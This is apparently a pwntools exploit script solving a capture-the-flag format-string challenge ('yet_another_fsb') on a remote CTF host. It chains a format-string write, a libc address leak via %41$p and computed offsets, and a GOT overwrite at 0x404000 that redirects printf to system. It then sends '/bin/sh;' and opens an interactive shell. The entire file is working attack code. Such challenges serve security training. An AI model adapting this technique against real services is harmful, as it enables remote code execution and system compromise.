#!/usr/bin/env python3

from pwn import *

exe = ELF("./yet_another_fsb_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
# ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

def main():
    # r = process(exe.path)

    # gdb.attach(r, gdbscript='''
    # b  *main+67
    # c
    # ''')
    HOST = "31993f6e9b4c1fc2a5fd130529f51600.chal.ctf.ae"
    r = remote(HOST, 443, ssl=True, sni=HOST)
    payload= f"c%7$hhn".encode().ljust(8,b"a")
    payload+=p8(0x2e)
    
    
    r.send(payload)

    payload = f"|||%41$p".encode()
    # input()
    r.send(payload)
    r.recvuntil(b'|||')
    libc_leak = int(r.recvn(14),16)
    libc_base = libc_leak - 0x25c88
    system = libc_base + 0x50f10

    slog('LIB leaked: ', libc_leak)
    slog('LIB base: ', libc_base)
    slog('SYSTEM ADDRESS: ', system)

    # overwrite printf('/bin/sh')

    part1 = system & 0xff
    part2 = (system >> 8) & 0xffff

    payload = f"%{part1}c%10$hhn".encode()
    payload += f'%{part2-part1}c%11$hn'.encode()
    payload = payload.ljust(32, b'a')

    payload += p64(0x404000)
    payload += p64(0x404000+1)
    # input()
    r.send(payload)

    r.send(b'/bin/sh;')



    r.interactive()


if __name__ == "__main__":
    main()
